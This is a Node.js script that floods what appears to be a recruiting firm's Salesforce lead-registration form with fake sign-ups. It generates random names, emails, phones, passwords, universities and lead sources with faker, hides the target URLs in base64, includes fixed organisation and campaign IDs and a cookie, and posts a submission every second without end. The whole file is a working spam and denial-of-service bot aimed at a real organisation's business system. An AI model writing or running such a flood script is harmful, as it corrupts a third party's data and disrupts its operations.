const faker = require('faker');
const university = [
    "Aberdeen", "Abertay Dundee", "Aberystwyth", "Anglia Ruskin", "Arts University Bournemouth", "Aston", "Bangor", "Baruch", "Bath", "Bath Spa", "Bedfordshire", "Belfast", "Binghamton", "Birkbeck College", "Birmingham", "Birmingham City", "Bishop Grosseteste", "Bolton", "Boston University", "Bournemouth", "Bradford", "Brighton", "Bristol", "Brunel", "Buckingham", "Buckinghamshire New", "Cal State Fullerton", "Cal State Long Beach", "Cambridge", "Canterbury Christ Church", "Cardiff", "Cardiff Metro", "Central Lancashire", "Chester", "Chichester", "City", "City of London University CASS", "Conservatoire for Dance and Drama", "Courtauld Institute of Art", "Coventry", "Cranfield", "CSUN (Northridge)", "Cumbria", "De Montfort", "Derby", "Drexel", "Dundee", "Durham", "East Anglia", "East London", "Edge Hill", "Edinburgh", "Edinburgh Napier", "Essex", "Exeter", "Fairley Dickenson", "Falmouth", "Fordham", "Glasgow", "Glasgow Caledonian", "Glasgow School of Art", "Gloucestershire", "Glyndwr", "Goldsmiths College", "Greenwich", "Guildhall School of Music and Drama", "Harper Adams", "Hatfield", "Heriot-Watt", "Hertfordshire", "Heythrop", "Hofstra", "Huddersfield", "Hull", "Imperial College London", "Institute of Cancer Research", "Institute of Education", "John Hopkins University", "Keele", "Kent", "King's College London", "Kingston", "Lancaster", "Leeds", "Leeds Beckett", "Leeds College of Art", "Leeds Trinity", "Leicester", "Lincoln", "Liverpool", "Liverpool Hope", "Liverpool John Moores", "London Business School", "London Metropolitan University", "London School of Economics", "London School of Hygiene and Tropical Medicine", "London South Bank", "Loughborough", "Manchester"
]
const lead_source = [
    "WeChat Group", "Zhihu", "Ref Friend", "Campus Visit", "Career Fair", "Facebook", "Google / Other Search", "MC Webinar", "Ref Candidate", "Seminar", "Sina Weibo", "Virtual Career Fair", "Web Registration", "Word of mouth", "Campus Ambassador (Consultant)", "Campus Ambassador (Management)", "Summer Lead Generation", "BA", "MOS managed BA", "MOS", "Other (please indicate)"
]
const url = Buffer.from("aHR0cHM6Ly93ZWJ0by5zYWxlc2ZvcmNlLmNvbS9zZXJ2bGV0L3NlcnZsZXQuV2ViVG9MZWFkP2VuY29kaW5nPVVURi04", 'base64').toString('binary')
const returl = Buffer.from("aHR0cHM6Ly93d3cubWNpd29ybGR3aWRlLmNvbS9sb2dpbi1yZWdpc3Rlci90aGFuay15b3UtZm9yLXJlZ2lzdGVyaW5nLw==", 'base64').toString('binary')
var axios = require('axios');
var FormData = require('form-data');


const sendPostRequest = async () => {

    // get random index value
    var randomIndex_uni = Math.floor(Math.random() * university.length);
    var randomIndex_lead = Math.floor(Math.random() * lead_source.length);
    var password = faker.internet.password()
    var firstName = faker.name.firstName()
    var lastName = faker.name.lastName()
    var email = faker.internet.email(firstName, lastName, faker.random.word() + '.' + faker.random.word());


    var data = new FormData();
    data.append('oid', '00D24000001aVwj');
    data.append('retURL', returl);
    data.append('first_name', firstName);
    data.append('last_name', lastName);
    data.append('phone', faker.phone.phoneNumber('0##########'));
    data.append('00N2400000BpoJI', university[randomIndex_uni]);
    data.append('email', email);
    data.append('Campaign_ID', '7011o000000cBhI');
    data.append('lead_source', lead_source[randomIndex_lead]);
    data.append('member_status', 'Responded');
    data.append('password', password);
    data.append('action', 'mc_sf_user_register');
    data.append('submit', 'Register');


    var config = {
        method: 'post',
        url: url,
        headers: { 
          'Cookie': 'BrowserId=JGeOcu_ZEeur-xGnwu6w1A', 
          ...data.getHeaders()
        },
        data : data
      };

    await axios(config)
        .then(function (response) {
            console.log(`Registration Complete: ${firstName} ${lastName} - ${email} - ${password}`)
        })
        .catch(function (error) {
            // console.log("Exception Happened. Registration Failed.")
            console.log(error)
        });
}

setInterval(sendPostRequest, 1000);
